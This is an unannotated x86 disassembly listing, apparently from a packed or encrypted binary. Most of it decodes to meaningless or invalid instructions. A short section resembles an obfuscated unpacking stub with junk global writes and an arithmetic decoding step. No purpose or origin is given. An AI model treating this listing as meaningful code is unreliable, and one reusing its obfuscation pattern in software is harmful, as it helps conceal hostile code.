  40713d:	bound  esi,QWORD PTR [ecx-0x1c457706]
  407143:	stos   BYTE PTR es:[edi],al
  407144:	and    al,0x78
  407146:	std    
  407147:	jge    0x4070e9
  407149:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40714a:	leave  
  40714b:	pop    ebx
  40714c:	(bad)
  40714f:	or     eax,DWORD PTR [edx]
  407151:	int    0xce
  407153:	xchg   ebx,eax
  407154:	sub    dl,BYTE PTR [edx-0x7b]
  407157:	mov    bl,0xa1
  407159:	inc    eax
  40715a:	jae    0x407168
  40715c:	icebp  
  40715d:	adc    dh,dl
  40715f:	fwait
  407160:	cld    
  407161:	int    0x3f
  407163:	adc    BYTE PTR [eax-0xe],cl
  407166:	(bad)  
  407167:	std    
  407168:	jge    0x407144
  40716a:	pop    ebx
  40716b:	jle    0x4071ea
  40716d:	jns    0x4071b9
  40716f:	xchg   esi,eax
  407170:	scas   eax,DWORD PTR es:[edi]
  407171:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407172:	cmp    al,0x6d
  407174:	popf   
  407175:	fild   WORD PTR [esp+eiz*8+0x5bb5bed7]
  40717c:	push   es
  40717d:	cs iret 
  40717f:	sti    
  407180:	aas    
  407181:	jg     0x40719a
  407183:	add    ebx,DWORD PTR [ecx+0x20cd5e5b]
  407189:	mov    ebx,0xcb9724
  40718e:	xor    eax,0xc671136
  407193:	aaa    
  407194:	add    dh,BYTE PTR [ecx]
  407196:	retf   0x9db7
  407199:	imul   si,si,0x8b8e
  40719e:	cs sahf 
  4071a0:	sbb    edx,DWORD PTR [esi+0x4dde43af]
  4071a6:	dec    ecx
  4071a7:	popa   
  4071a8:	cmp    ebx,DWORD PTR [esi+edi*4-0x33]
  4071ac:	sub    al,BYTE PTR [esi-0x79]
  4071af:	jg     0x40720b
  4071b1:	jle    0x4071a4
  4071b3:	test   ch,ch
  4071b5:	inc    ebp
  4071b6:	rol    eax,1
  4071b8:	enter  0x490,0x95
  4071bc:	in     al,0xf7
  4071be:	push   ds
  4071bf:	jo     0x407156
  4071c1:	sbb    DWORD PTR [edx+0x3d],ebp
  4071c4:	jns    0x40717c
  4071c6:	pop    ds
  4071c7:	clc    
  4071c8:	adc    al,0xa4
  4071ca:	and    eax,DWORD PTR [edx]
  4071cc:	pop    esp
  4071cd:	aas    
  4071ce:	xchg   esp,eax
  4071cf:	inc    eax
  4071d0:	repnz push edi
  4071d2:	and    edx,eax
  4071d4:	and    esi,0xffffffc6
  4071d7:	sub    eax,DWORD PTR [ebp+0x144dc518]
  4071dd:	adc    dh,al
  4071df:	mov    es,WORD PTR ds:0xece169a6
  4071e5:	xchg   ebx,eax
  4071e6:	push   ecx
  4071e7:	out    dx,al
  4071e8:	mov    esi,ecx
  4071ea:	jle    0x4071ad
  4071ec:	repnz mov WORD PTR [eax-0x61a05046],cs
  4071f3:	sar    BYTE PTR [ebx+edi*4],cl
  4071f6:	(bad)  
  4071f7:	mov    bh,0xcf
  4071f9:	adc    eax,0x65cc830c
  4071fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4071ff:	push   esp
  407200:	xlat   BYTE PTR ds:[ebx]
  407201:	ins    DWORD PTR es:[edi],dx
  407202:	jg     0x40718d
  407204:	mov    DWORD PTR [ebp-0x30],edx
  407207:	cli    
  407208:	or     esi,DWORD PTR gs:[eax-0x79]
  40720c:	mov    bl,0x16
  40720e:	call   0x414b:0x35fb4f30
  407215:	pop    ebx
  407216:	push   0xb5c19a65
  40721b:	push   cs
  40721c:	aam    0x4d
  40721e:	pop    esp
  40721f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407220:	hlt    
  407221:	or     al,0xca
  407223:	jae    0x40727a
  407225:	ds cli 
  407227:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407228:	jno    0x407222
  40722a:	or     ebx,ecx
  40722c:	aas    
  40722d:	aad    0xec
  40722f:	test   BYTE PTR [eax-0x3e],bh
  407232:	mov    dl,0x0
  407234:	dec    eax
  407235:	mov    ebx,0x6f2b3094
  40723a:	mov    edi,0x8471e9be
  40723f:	ror    BYTE PTR [ebx+0x2136f268],0x58
  407246:	mov    di,0x7db6
  40724a:	inc    esp
  40724b:	mov    DWORD PTR [ebp-0x2c],0x4f39
  407252:	mov    DWORD PTR ds:0x43466f,0x15ae
  40725c:	cmp    eax,DWORD PTR [edx]
  40725e:	mov    DWORD PTR ds:0x43465f,0x344d
  407268:	je     0x40836f
  40726e:	mov    DWORD PTR [ebp-0xc],0x705fd8c
  407275:	lea    eax,[ebp-0xc]
  407278:	add    DWORD PTR ds:0x434793,0x434663
  407282:	mov    DWORD PTR [ebp-0x10],eax
  407285:	xor    eax,DWORD PTR ds:0x434687
  40728b:	mov    eax,DWORD PTR [ebp-0x10]
  40728e:	not    edx
  407290:	mov    edx,DWORD PTR [eax]
  407292:	or     DWORD PTR ds:0x43467b,0x7c2e
  40729c:	imul   edx,edx,0xf89ea9ed
  4072a2:	mov    DWORD PTR ds:0x4346cb,0x5d50
  4072ac:	mov    DWORD PTR [eax],edx
  4072ae:	mov    DWORD PTR ds:0x4346bb,0x7ba0
  4072b8:	mov    eax,DWORD PTR [ebp-0xc]
  4072bb:	cmp    eax,0x9155269c
  4072c0:	je     0x4076db
  4072c6:	mov    edi,DWORD PTR ds:0x43476f
  4072cc:	mov    eax,ds:0x4347b3
  4072d1:	sub    eax,edi
  4072d3:	sub    edi,DWORD PTR [edi+eax*1]
  4072d6:	mov    eax,DWORD PTR [ebp-0x1c]
  4072d9:	or     DWORD PTR [eax],0x60751c9d
  4072df:	mov    eax,DWORD PTR [ebp-0x8]
  4072e2:	xor    eax,ecx
  4072e4:	add    eax,esi
  4072e6:	pop    edi
  4072e7:	pop    esi
  4072e8:	jmp    0x4076d6
  4072ed:	pop    ds
  4072ee:	add    al,0x2a
  4072f0:	or     eax,0x2c313d35
  4072f5:	add    eax,0xc4907a48
  4072fa:	(bad)  
  4072fb:	fsubr  QWORD PTR [esi+0x3f]
  4072fe:	iret   
  4072ff:	jle    0x40737f
  407301:	dec    edi
  407302:	jns    0x407382
  407304:	jle    0x407308
  407306:	(bad)  
  407307:	retf   
  407308:	mov    al,0xa9
  40730a:	xor    al,BYTE PTR [edi*1-0x4423ec71]
  407311:	mov    edx,0xb7f66da4
  407316:	fnsave [eax-0x29]
  407319:	repnz ficom DWORD PTR [esi]
  40731c:	pop    ds
  40731d:	sahf   
  40731e:	push   ebp
  40731f:	test   eax,0x72935d74
  407324:	stc    
  407325:	pop    eax
  407326:	or     DWORD PTR ds:[ebp*1+0x76500b0b],eax
  40732e:	aas    
  40732f:	stos   BYTE PTR es:[edi],al
  407330:	and    DWORD PTR [esi],edx
  407332:	dec    ebp
  407333:	icebp  
  407334:	mov    eax,0x95d6e696
  407339:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40733a:	or     BYTE PTR [ebx+0x55],0x65
  40733e:	cwde   
  40733f:	xor    BYTE PTR [edx],0xfe
  407342:	sub    BYTE PTR [esi],0x29
  407345:	xchg   ebp,eax
  407346:	add    DWORD PTR [esi+0x66],edi
  407349:	jb     0x407355
  40734b:	call   0x653eea5a
  407350:	cwde   
  407351:	and    cl,ch
  407353:	cli    
  407354:	sub    edx,DWORD PTR [ebx-0x7f]
  407357:	add    al,0x3f
  407359:	xor    bh,BYTE PTR [esi+0x36a304e]
  40735f:	jnp    0x407398
  407361:	repz sti 
  407363:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407364:	in     al,dx
  407365:	adc    ah,dl
  407367:	fild   QWORD PTR [edi+0x71e21da7]
  40736d:	sbb    ch,BYTE PTR [esp+ebx*8+0x3b20d3b3]
  407374:	xor    dl,BYTE PTR [ecx]
  407376:	out    0x3c,eax
  407378:	call   0xa2d2:0xf701550c
  40737f:	jo     0x407314
  407381:	(bad)  
  407382:	pop    eax
  407383:	jl     0x407387
  407385:	les    esi,FWORD PTR [edi+edx*8+0x7b]
  407389:	add    DWORD PTR [edx+ecx*2-0x5],ebx
  40738d:	push   0xffffffe3
  40738f:	loope  0x407339
  407391:	jmp    0x426e:0xf46b558e
  407398:	pop    edx
  407399:	and    DWORD PTR ds:0x319d6131,ebx
  40739f:	lods   al,BYTE PTR ds:[esi]
  4073a0:	lea    edx,ds:0x21176d5b
  4073a6:	mov    ebp,0x7ac57fcc
  4073ab:	push   ds
  4073ac:	aaa    
  4073ad:	ss dec ecx
  4073af:	fst    DWORD PTR [esi+0x15]
  4073b2:	dec    edx
  4073b3:	sbb    al,BYTE PTR [ebx]
  4073b5:	or     al,0xa1
  4073b7:	cli    
  4073b8:	jbe    0x9724f3c5
  4073be:	xor    ch,BYTE PTR [ecx-0x69]
  4073c1:	test   BYTE PTR [eax+0x5d],dl
  4073c4:	mov    ah,0xaf
  4073c6:	xchg   ebp,eax
  4073c7:	daa    
  4073c8:	scas   eax,DWORD PTR es:[edi]
  4073c9:	jmp    0x407415
  4073cb:	sub    ecx,DWORD PTR [edx]
  4073cd:	adc    BYTE PTR [edx],bh
  4073cf:	mov    ah,0x86
  4073d1:	fisubr DWORD PTR [ebx+0x54ce40a2]
  4073d7:	in     eax,dx
  4073d8:	lock ret 
  4073da:	ss jne 0x4073c8
  4073dd:	add    al,0xf6
  4073df:	in     al,dx
  4073e0:	pop    ebp
  4073e1:	test   ebp,esi
  4073e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4073e4:	test   al,0xda
  4073e6:	iret   
  4073e7:	xchg   edx,eax
  4073e8:	jle    0x4073e1
  4073ea:	adc    edi,esp
  4073ec:	fs jns 0x4073cf
  4073ef:	and    edx,ebx
  4073f1:	hlt    
  4073f2:	and    al,0xcd
  4073f4:	jnp    0x4073d4
  4073f6:	sbb    BYTE PTR [eax-0x4449bfe],bh
  4073fc:	and    edx,DWORD PTR [edi+0x77a94b5c]
  407402:	lods   eax,DWORD PTR ds:[esi]
  407403:	or     edi,DWORD PTR [ecx+0x1768ffd]
  407409:	jecxz  0x407489
  40740b:	mov    bh,0x7a
  40740d:	xchg   BYTE PTR [esi+0x6c90e4d5],dl
  407413:	scas   eax,DWORD PTR es:[edi]
  407414:	(bad)  
  407415:	stc    
  407416:	xchg   esi,eax
  407417:	mov    edx,0x745f3cff
  40741c:	enter  0x2e46,0xf4
  407420:	fnstcw WORD PTR [edi+0xb0843c2]
  407426:	retf   
  407427:	mov    esp,0x32b42d3a
  40742c:	int    0xc4
  40742e:	and    eax,0xecc2ed8d
  407433:	jne    0x407441
  407435:	in     al,dx
  407436:	jae    0x4073cf
  407438:	cli    
  407439:	pop    ds
  40743a:	jmp    FWORD PTR [edx-0x672062e5]
  407440:	lock out dx,al
  407442:	dec    esi
  407443:	sbb    ebp,esp
  407445:	jg     0x407494
  407447:	std    
  407448:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407449:	dec    esi
  40744a:	in     al,0xba
  40744c:	and    eax,0x298ea1d3
  407451:	fadd   QWORD PTR [ecx-0xf475a6f]
  407457:	cmp    esp,DWORD PTR [edx]
  407459:	adc    BYTE PTR [edx-0x54],bl
  40745c:	adc    ebx,DWORD PTR [edx-0x6]
  40745f:	iret   
  407460:	mov    dh,0xb3
  407462:	jle    0x4074b3
  407464:	dec    ebx
  407465:	cmp    eax,0x4967dca0
  40746a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40746b:	jb     0x407411
  40746d:	hlt    
  40746e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40746f:	nop
  407470:	jp     0x1b4f8aa8
  407476:	pop    esi
  407477:	mov    edi,0x430d82f0
  40747c:	jp     0x40749a
  40747e:	jp     0x40742b
  407480:	clc    
  407481:	sbb    al,0x23
  407483:	loope  0x40744c
  407485:	sbb    DWORD PTR [edi],ebp
  407487:	aad    0x5b
  407489:	ins    BYTE PTR es:[edi],dx
  40748a:	inc    esp
  40748b:	aaa    
  40748c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40748d:	sbb    al,0x3f
  40748f:	cmp    eax,0xd8854036
  407494:	push   edi
  407495:	mov    dh,0x57
  407497:	fist   WORD PTR ds:0xa7dc5111
  40749d:	or     BYTE PTR [esi-0x2b489c7a],ah
  4074a3:	lahf   
  4074a4:	sbb    ebx,eax
  4074a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4074a7:	mov    edx,0x4abd15fc
  4074ac:	xor    eax,0xf7013f2e
  4074b1:	sbb    al,0x3c
  4074b3:	sub    ecx,DWORD PTR [eax+0x4]
  4074b6:	dec    edi
  4074b7:	mov    eax,ds:0xac9f6557
  4074bc:	popa   
  4074bd:	scas   eax,DWORD PTR es:[edi]
  4074be:	aad    0x68
  4074c0:	(bad)  
  4074c1:	cmp    dh,dl
  4074c3:	or     BYTE PTR [edi+0x11d4df30],ch
  4074c9:	shl    BYTE PTR [edi+0x30],0x2c
  4074cd:	xchg   BYTE PTR [ebx+0x1c],dl
  4074d0:	outs   dx,DWORD PTR ds:[esi]
  4074d1:	adc    eax,eax
  4074d3:	cwde   
  4074d4:	je     0x407550
  4074d6:	jecxz  0x4074ac
  4074d8:	sti    
  4074d9:	xor    DWORD PTR [edi],edx
  4074db:	xor    BYTE PTR [edi+edi*8+0x66],0xd7
  4074e0:	rcr    DWORD PTR [ecx+eax*1+0x33],cl
  4074e4:	loop   0x407552
  4074e6:	sbb    DWORD PTR [eax-0x4d],ebx
  4074e9:	dec    eax
  4074ea:	cmp    ah,BYTE PTR [ebp-0x25bcfb25]
  4074f0:	jns    0x4074f8
  4074f2:	inc    ebp
  4074f3:	test   DWORD PTR [ecx-0x13],edx
  4074f6:	inc    esi
  4074f7:	xor    dl,BYTE PTR [edi+0x4d]
  4074fa:	push   ecx
  4074fb:	jecxz  0x40751e
  4074fd:	mov    al,0xe8
  4074ff:	jo     0x4074db
  407501:	cmp    al,0xb3
  407503:	out    0xdc,eax
  407505:	sti    
  407506:	mov    ecx,0x18ae431a
  40750b:	cmp    eax,0x8ff4acab
  407510:	mov    eax,0x60c9a31d
  407515:	iret   
  407516:	cdq    
  407517:	jp     0x407510
  407519:	enter  0xa6f2,0x41
  40751d:	and    al,0xc3
  40751f:	adc    al,0x5f
  407521:	jb     0x407560
  407523:	mov    ebx,DWORD PTR [ecx]
  407525:	test   al,0xe1
  407527:	xor    BYTE PTR [esi-0x334a00cb],ah
  40752d:	fwait
  40752e:	cmp    ah,cl
  407530:	mov    WORD PTR [edx],gs
  407532:	xchg   DWORD PTR [eax+0x3c],esi
  407535:	push   ss
  407536:	aad    0x30
  407538:	or     esp,DWORD PTR [edx]
  40753a:	push   esi
  40753b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40753c:	jae    0x407568
  40753e:	outs   dx,DWORD PTR ds:[esi]
  40753f:	fiadd  DWORD PTR [eax-0x26]
  407542:	jns    0x4074ed
  407544:	and    DWORD PTR [ecx],esi
  407546:	dec    esi
  407547:	xchg   esi,eax
  407548:	pop    ds
  407549:	mov    ebp,0x53121011
  40754e:	jb     0x407567
  407550:	rcl    DWORD PTR ds:0xcd4bd004,1
  407556:	jge    0x40753d
  407558:	xor    BYTE PTR [eax-0x67c09943],bh
  40755e:	pop    edi
  40755f:	and    esp,esi
  407561:	add    esi,DWORD PTR [ebx]
  407563:	scas   al,BYTE PTR es:[edi]
  407564:	outs   dx,BYTE PTR ds:[esi]
  407565:	inc    edi
  407566:	cwde   
  407567:	pop    edi
  407568:	add    BYTE PTR [esi],dh
  40756a:	ins    DWORD PTR es:[edi],dx
  40756b:	aas    
  40756c:	sub    ah,al
  40756e:	outs   dx,BYTE PTR ds:[esi]
  40756f:	lock nop
  407571:	pop    esp
  407572:	mov    ds:0x4c8e822a,eax
  407577:	mov    edx,0x53ec5d00
  40757c:	add    esi,DWORD PTR [esi]
  40757e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40757f:	cmc    
  407580:	xchg   esi,eax
  407581:	sub    al,0x9
  407583:	adc    DWORD PTR [esi],edx
  407585:	dec    edi
  407586:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  407588:	lahf   
  407589:	dec    ebp
  40758a:	cmp    eax,0x43b4354b
  40758f:	ret    0xd570
  407592:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407593:	neg    BYTE PTR [edx-0x64]
  407596:	inc    edi
  407597:	push   ebx
  407598:	or     DWORD PTR [esi],ebx
  40759a:	ds jne 0x407573
  40759d:	xchg   esi,eax
  40759e:	and    cl,bl
  4075a0:	loope  0x40761b
  4075a2:	pop    ds
  4075a3:	sahf   
  4075a4:	ror    DWORD PTR [edx-0x22],0xa4
  4075a8:	fnclex 
  4075aa:	pusha  
  4075ab:	ss jge 0x40758e
  4075ae:	pop    eax
  4075af:	ds cdq 
  4075b1:	out    dx,al
  4075b2:	mov    esp,0x5c8bda80
  4075b7:	xchg   edi,edi
  4075b9:	mov    ds:0xa965824e,al
  4075be:	mov    bl,0xc0
  4075c0:	mov    edx,0xd38f8f63
  4075c5:	cmp    eax,0xc880bf5e
  4075ca:	das    
  4075cb:	adc    al,0x71
  4075cd:	xor    eax,0x1a58fe49
  4075d2:	out    dx,eax
  4075d3:	bound  ebx,QWORD PTR [ebx+ebp*8+0x4b8b0fbb]
  4075da:	ret    0xa3a0
  4075dd:	pop    edi
  4075de:	cdq    
  4075df:	arpl   WORD PTR [edx-0x2b],di
  4075e2:	retf   
  4075e3:	out    dx,eax
  4075e4:	imul   ecx,DWORD PTR [eax+0x27],0xffffffe8
  4075e8:	adc    eax,0xea6ff144
  4075ed:	jl     0x407582
  4075ef:	cmp    DWORD PTR [ecx+0x5],edx
  4075f2:	cs pop esi
  4075f4:	push   ebx
  4075f5:	inc    ebp
  4075f6:	ficom  WORD PTR [ebx+0x19]
  4075f9:	das    
  4075fa:	test   DWORD PTR [edi+eax*2+0x11],esp
  4075fe:	mov    edx,esi
  407600:	xor    bl,ah
  407602:	xor    DWORD PTR [ebp+0x56],ecx
  407605:	into   
  407606:	scas   eax,DWORD PTR es:[edi]
  407607:	mov    eax,0x4d043397
  40760c:	xlat   BYTE PTR ds:[ebx]
  40760d:	jbe    0x407642
  40760f:	jle    0x4075be
  407611:	cmp    bl,BYTE PTR [ebp+0x8ed2904]
  407617:	xor    ebx,DWORD PTR ds:0xb30cfff9
  40761d:	sti    
  40761e:	add    ebp,DWORD PTR [esi+0x29]
  407621:	dec    eax
  407622:	bound  ebx,QWORD PTR [edi-0x28]
  407625:	sahf   
  407626:	je     0x407697
  407628:	mov    bl,0x61
  40762a:	pop    ss
  40762b:	pop    esp
  40762c:	push   ebx
  40762d:	push   eax
  40762e:	inc    edi
  40762f:	push   ebx
  407630:	push   ss
  407631:	(bad)  
  407632:	sahf   
  407633:	cs imul ebp,DWORD PTR cs:[ebx+0x3],0x59
  407639:	repz (bad) 
  40763b:	outs   dx,BYTE PTR ds:[esi]
  40763c:	out    dx,eax
  40763d:	sbb    ebp,DWORD PTR [edx-0xc799b8a]
  407643:	jbe    0x4076a4
  407645:	dec    edx
  407646:	in     eax,0xc1
  407648:	push   edi
  407649:	ds inc edi
  40764b:	sbb    al,0x4d
  40764d:	add    al,BYTE PTR [edx+0x2f3da43]
  407653:	mov    ebp,0xb1c1e0bb
  407658:	cld    
  407659:	das    
  40765a:	fs es scas al,BYTE PTR es:[edi]
  40765d:	and    BYTE PTR [ebp+0x13256f41],bh
  407663:	sbb    BYTE PTR [eax+0x631fa361],bl
  407669:	pop    es
  40766a:	mov    dh,0xb0
  40766c:	addr16 xchg edx,eax
  40766e:	mov    al,ds:0x977a5145
  407673:	push   eax
  407674:	shl    BYTE PTR [eax],1
  407676:	and    DWORD PTR [ebx+0x26],0xa4e880f4
  40767d:	push   eax
  40767e:	aad    0xb5
  407680:	scas   al,BYTE PTR es:[edi]
  407681:	xor    eax,0xcd3456b3
  407686:	dec    esp
  407687:	stos   DWORD PTR es:[edi],eax
  407688:	loop   0x40769e
  40768a:	ud0    ebx,ebx
  40768d:	into   
  40768e:	inc    ebx
  40768f:	ss push edi
  407691:	cdq    
  407692:	pop    edi
  407693:	xor    BYTE PTR [ecx+0x18],al
  407696:	mov    ch,0xcd
  407698:	mov    DWORD PTR [ecx],esp
  40769a:	mov    ebx,0xcd1c7f7e
  40769f:	repz jo 0x40762d
  4076a2:	add    al,cl
  4076a4:	pop    es
  4076a5:	or     esp,ebx
  4076a7:	pusha  
  4076a8:	xor    BYTE PTR [ecx-0x18],al
  4076ab:	pop    ss
  4076ac:	les    edi,FWORD PTR [ecx+0x46]
  4076af:	stos   DWORD PTR es:[edi],eax
  4076b0:	jge    0x4076e6
  4076b2:	dec    ebx
  4076b3:	out    dx,eax
  4076b4:	and    esp,DWORD PTR [edi+0x1400024f]
  4076ba:	imul   esi,eax,0x9877dea9
  4076c0:	fbstp  TBYTE PTR [eax+0x7]
  4076c3:	push   esp
  4076c4:	out    0x79,eax
  4076c6:	out    dx,al
  4076c7:	dec    edx
  4076c8:	sar    dh,0xde
  4076cb:	adc    eax,0xd9353c48
  4076d0:	mov    edi,0x95983729
  4076d5:	mov    esp,0x4c2c95b
  4076da:	add    BYTE PTR [ebx+0x4503f445],cl
  4076e0:	call   0xf494c122
  4076e5:	mov    DWORD PTR [edi],ecx
  4076e7:	test   BYTE PTR [esi],cl
  4076e9:	add    BYTE PTR [eax],al
  4076eb:	add    BYTE PTR [ebx+0x2081f045],cl
  4076f1:	sahf   
  4076f2:	sbb    al,0x75
  4076f4:	add    cl,ch
  4076f6:	in     eax,0xfb
  4076f8:	(bad)  
  4076f9:	dec    DWORD PTR [ebx+0x558bf445]
  4076ff:	call   0xbe7e390f
  407704:	das    
  407705:	(bad)  
  407707:	je     0x407b09
  40770d:	jmp    0x407afb
  407712:	ret    
  407713:	or     esi,DWORD PTR [ebx+eiz*1+0x7c]
  407717:	ins    DWORD PTR es:[edi],dx
  407718:	pop    ebp
  407719:	jmp    0x407762
  40771b:	(bad)  
  40771c:	pop    ecx
  40771d:	sbb    eax,0x98e7e641
  407722:	or     bl,cl
  407724:	jle    0x4077a4
  407726:	dec    edi
  407727:	jns    0x4077a7
  407729:	jle    0x4076be
  40772b:	adc    al,0x58
  40772d:	sahf   
  40772e:	call   0x8e22:0x6aec0cbb
  407735:	mov    esi,ss
  407737:	push   ss
  407738:	xlat   BYTE PTR ds:[ebx]
  407739:	cmp    cl,BYTE PTR [eax]
  40773b:	mov    es,WORD PTR [eax-0x425a256f]
  407741:	jge    0x4076f5
  407743:	inc    esp
  407744:	ret    0x69be
  407747:	test   DWORD PTR [ebp-0xd3d1382],ebx
  40774d:	jmp    0x40770f
  40774f:	ficomp WORD PTR [edx]
  407751:	cmp    edx,edx
  407753:	aaa    
  407754:	mul    DWORD PTR [edx]
  407756:	in     al,0x4d
  407758:	xchg   edi,eax
  407759:	js     0x407720
  40775b:	inc    ax
  40775d:	retf   
  40775e:	stos   DWORD PTR es:[edi],eax
  40775f:	fild   QWORD PTR [edi+0x9bbd0c3]
  407765:	dec    ebx
  407766:	outs   dx,DWORD PTR ds:[esi]
  407767:	cmc    
  407768:	or     cl,BYTE PTR [edi+eiz*8+0x49be4b05]
  40776f:	jno    0x407789
  407771:	mov    dl,0x28
  407773:	lods   eax,DWORD PTR ds:[esi]
  407774:	mov    ecx,0x281e521
  407779:	xchg   DWORD PTR [ecx],ebp
  40777b:	imul   edx,ebp,0x52c34411
  407781:	arpl   WORD PTR [ebp+0x71],si
  407784:	sbb    BYTE PTR [ecx+0x31],dl
  407787:	shl    DWORD PTR [edi+0x4347c2bd],0x72
  40778e:	push   ecx
  40778f:	cmp    al,0x8
  407791:	lahf   
  407792:	mov    cl,0x60
  407794:	xchg   ecx,edi
  407796:	retf   
  407797:	xchg   edi,eax
  407798:	pop    esi
  407799:	bound  ebx,QWORD PTR [esi+0xeb3a0c1]
  40779f:	aad    0x45
  4077a1:	sub    DWORD PTR [edx],ecx
  4077a3:	or     DWORD PTR [ebx],edi
  4077a5:	(bad)  
  4077a6:	push   ds
  4077a7:	cmp    edx,DWORD PTR [ebp-0x12]
  4077aa:	cmp    al,0xb5
  4077ac:	mov    ds:0xf1c8c12f,eax
  4077b1:	dec    esp
  4077b2:	repnz aad 0xda
  4077b5:	mov    ecx,0xb437140a
  4077ba:	add    al,0x12
  4077bc:	inc    eax
  4077bd:	rcl    BYTE PTR [ebx],1
  4077bf:	imul   ecx,DWORD PTR [esi],0x162af281
  4077c5:	ins    DWORD PTR es:[edi],dx
  4077c6:	hlt    
  4077c7:	fdivr  st,st(4)
  4077c9:	pop    edi
  4077ca:	sub    BYTE PTR [edi+0x23],dl
  4077cd:	(bad)  
  4077ce:	sub    dl,bl
  4077d0:	xchg   BYTE PTR [ecx+0x4c],dl
  4077d3:	sbb    al,0xd2
  4077d5:	fcomp  DWORD PTR [ebx+0x4e]
  4077d8:	inc    ecx
  4077d9:	xor    eax,0xd12018fd
  4077de:	mov    cl,0x96
  4077e0:	xchg   DWORD PTR [esi],eax
  4077e2:	sub    al,0xb9
  4077e4:	mov    ebx,0x76fcf701
  4077e9:	mov    ebx,0xc34306bc
  4077ee:	adc    ebx,edi
  4077f0:	pop    ebx
  4077f1:	out    dx,al
  4077f2:	sbb    eax,0xe560d1f4
  4077f7:	mov    DWORD PTR [esi+0x5f],0x53811355
  4077fe:	xchg   ecx,eax
  4077ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407800:	dec    eax
  407801:	sub    eax,0x6b0e73a0
  407806:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407807:	sub    eax,0x6ce2c61c
  40780c:	cld    
  40780d:	ja     0x4077c5
  40780f:	push   ecx
  407810:	sub    eax,0x48fb8c5a
  407815:	shl    BYTE PTR [esi+eax*2-0x2f],0xf7
  40781a:	sub    al,0x62
  40781c:	or     al,0x3f
  40781e:	cmp    ecx,edi
  407820:	sub    esi,DWORD PTR [eax-0x5ede0c30]
  407826:	jmp    0x407882
  407828:	in     al,0x23
  40782a:	fisttp QWORD PTR [ebx-0x135498ce]
  407830:	xchg   edx,eax
  407831:	and    al,0x87
  407833:	mov    esi,0x97924e96
  407838:	jge    0x407823
  40783a:	push   0xbef7d8d5
  40783f:	loop   0x4078ab
  407841:	gs leave 
  407843:	aam    0x7e
  407845:	data16 mov fs,WORD PTR [esi+edx*1]
  407849:	lds    ecx,FWORD PTR [ebp-0x4717f23]
  40784f:	ss loop 0x407808
  407852:	mov    dl,0x8d
  407854:	sub    DWORD PTR [ecx],ebp
  407856:	dec    ebx
  407857:	lds    edx,FWORD PTR [ecx-0x7d295402]
  40785d:	dec    ecx
  40785e:	int3   
  40785f:	ss dec ebp
  407861:	sub    al,0xb0
  407863:	(bad)  
  407864:	ja     0x4078c0
  407866:	cmp    DWORD PTR [esi+ebx*2-0x479821f3],ebp
  40786d:	dec    edi
  40786e:	mov    al,ds:0xae65be54
  407873:	aaa    
  407874:	lea    esi,[edx+edx*4]
  407877:	adc    DWORD PTR [esi],0xffffff8a
  40787a:	loop   0x4078a3
  40787c:	fnstenv [edx]
  40787e:	push   ds
  40787f:	xchg   DWORD PTR [ecx],esp
  407881:	inc    ebx
  407882:	cmp    dl,BYTE PTR [edx]
  407884:	add    edi,eax
  407886:	arpl   WORD PTR ds:0x134b17bf,si
  40788c:	outs   dx,DWORD PTR ds:[esi]
  40788d:	dec    eax
  40788e:	enter  0xfe71,0x3f
  407892:	inc    ebx
  407893:	mov    ah,0xba
  407895:	or     eax,0x9553b0e1
  40789a:	pop    esi
  40789b:	aaa    
  40789c:	out    0x11,al
  40789e:	sub    ecx,DWORD PTR [ebp+0x7c9582e5]
  4078a4:	add    BYTE PTR [ecx],al
  4078a6:	div    al
  4078a8:	push   ebp
  4078a9:	jle    0x4078b6
  4078ab:	or     BYTE PTR [ecx+0x6],dh
  4078ae:	fwait
  4078af:	aad    0xec
  4078b1:	inc    eax
  4078b2:	inc    esp
  4078b3:	mov    bh,BYTE PTR [ebp+edi*4+0x4937ffbc]
  4078ba:	(bad)  
  4078bb:	jmp    0x3b2add2f
  4078c0:	lock out dx,al
  4078c2:	jae    0x407876
  4078c4:	xor    esi,edx
  4078c6:	dec    esi
  4078c7:	cmp    DWORD PTR cs:[edx+0x4087525e],ecx
  4078ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4078cf:	inc    esp
  4078d0:	rol    BYTE PTR [ecx-0x39],1
  4078d3:	jbe    0x4078c1
  4078d5:	dec    esi
  4078d6:	sub    edi,DWORD PTR [edi+0x5d265205]
  4078dc:	inc    edi
  4078dd:	fidivr DWORD PTR [eax+0x3bd10bc1]
  4078e3:	mov    eax,ecx
  4078e5:	pop    es
  4078e6:	mov    ds:0xdeafa038,eax
  4078eb:	int    0xa6
  4078ed:	out    dx,eax
  4078ee:	aam    0xa4
  4078f0:	mov    cl,BYTE PTR [edx]
  4078f2:	sahf   
  4078f3:	xchg   BYTE PTR [edx],ch
  4078f5:	(bad)  
  4078f6:	aas    
  4078f7:	xor    ebp,DWORD PTR [esi]
  4078f9:	cvttps2pi mm1,QWORD PTR [ebp+0x62]
  4078fd:	into   
  4078fe:	test   DWORD PTR [eax-0x4b],edx
  407901:	sub    DWORD PTR [ebx+0xe51aeba],edx
  407907:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407908:	pop    edi
  407909:	mov    edx,0x134a33af
  40790e:	int3   
  40790f:	cmp    eax,0xff3e4793
  407914:	ror    BYTE PTR [eax+0x47],1
  407917:	pop    es
  407918:	jmp    0xaba4d7dc
  40791d:	pop    eax
  40791e:	dec    edx
  40791f:	pop    ss
